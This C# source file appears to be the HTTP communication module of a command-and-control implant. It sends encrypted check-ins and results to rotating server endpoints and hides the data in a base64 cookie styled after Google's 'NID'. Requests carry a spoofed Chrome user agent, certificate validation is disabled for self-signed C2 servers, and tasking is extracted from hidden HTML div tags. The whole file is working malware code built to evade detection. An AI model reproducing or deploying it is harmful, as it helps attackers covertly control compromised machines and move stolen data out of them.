using System;
using System.IO;
using System.Net;
using System.Text;
using Agent.Core;

namespace Agent.Comms
{
    /// <summary>
    /// HTTP/HTTPS communication channel.
    /// Sends C2 data via HTTP requests according to the malleable profile.
    /// </summary>
    public class HttpChannel : IChannel
    {
        private readonly string[] _endpoints;
        private int _currentEndpoint;

        public HttpChannel(string[] endpoints)
        {
            _endpoints = endpoints;
            _currentEndpoint = 0;

            // Accept all certificates (self-signed C2)
            ServicePointManager.ServerCertificateValidationCallback =
                (sender, cert, chain, errors) => true;
            // TLS 1.2
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
        }

        public byte[] PerformKeyExchange(byte[] agentId, byte[] agentEcdhPublicKey,
            byte[] rsaPublicKey)
        {
            // Build key exchange payload: agentId(16B) + ecdhPub(65B)
            byte[] payload = new byte[agentId.Length + agentEcdhPublicKey.Length];
            Array.Copy(agentId, 0, payload, 0, agentId.Length);
            Array.Copy(agentEcdhPublicKey, 0, payload, agentId.Length,
                agentEcdhPublicKey.Length);

            // RSA-encrypt the payload for initial key exchange
            // For Phase 1, send as-is (RSA encryption handled by caller or skipped)
            return SendRequest(payload);
        }

        public byte[] CheckIn(byte[] encryptedPayload)
        {
            return SendRequest(encryptedPayload);
        }

        public void SendResult(byte[] encryptedPayload)
        {
            SendRequest(encryptedPayload);
        }

        public bool IsAvailable()
        {
            try
            {
                var req = (HttpWebRequest)WebRequest.Create(CurrentEndpoint);
                req.Method = "HEAD";
                req.Timeout = 5000;
                using (var resp = (HttpWebResponse)req.GetResponse())
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        private string CurrentEndpoint
        {
            get { return _endpoints[_currentEndpoint % _endpoints.Length]; }
        }

        private byte[] SendRequest(byte[] data)
        {
            string url = CurrentEndpoint;

            // Encode data as base64 for the cookie (default profile)
            string encoded = Convert.ToBase64String(data);

            var req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "GET";
            req.UserAgent =
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
                "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
            req.Headers.Add("Cookie", "NID=" + encoded);
            req.Accept = "text/html,application/xhtml+xml,*/*;q=0.8";
            req.Timeout = 30000;

            try
            {
                using (var resp = (HttpWebResponse)req.GetResponse())
                using (var stream = resp.GetResponseStream())
                {
                    if (stream == null) return new byte[0];

                    using (var ms = new MemoryStream())
                    {
                        stream.CopyTo(ms);
                        byte[] body = ms.ToArray();

                        // Extract C2 data from response body
                        return ExtractResponseData(body);
                    }
                }
            }
            catch (WebException ex)
            {
                // Rotate endpoint on failure
                _currentEndpoint = (_currentEndpoint + 1) % _endpoints.Length;
                throw;
            }
        }

        private byte[] ExtractResponseData(byte[] responseBody)
        {
            // Default profile: response data is base64-encoded in the body,
            // wrapped in HTML (between <div style="display:none"> tags).
            string body = Encoding.UTF8.GetString(responseBody);

            // Find the encoded data between wrapper markers
            string startMarker = "<div style=\"display:none\">";
            string endMarker = "</div>";

            int start = body.IndexOf(startMarker);
            if (start < 0)
            {
                // No wrapper — try treating entire body as base64
                try { return Convert.FromBase64String(body.Trim()); }
                catch { return responseBody; }
            }

            start += startMarker.Length;
            int end = body.IndexOf(endMarker, start);
            if (end < 0) end = body.Length;

            string encoded = body.Substring(start, end - start).Trim();
            if (string.IsNullOrEmpty(encoded)) return new byte[0];

            try
            {
                return Convert.FromBase64String(encoded);
            }
            catch
            {
                return responseBody;
            }
        }
    }
}
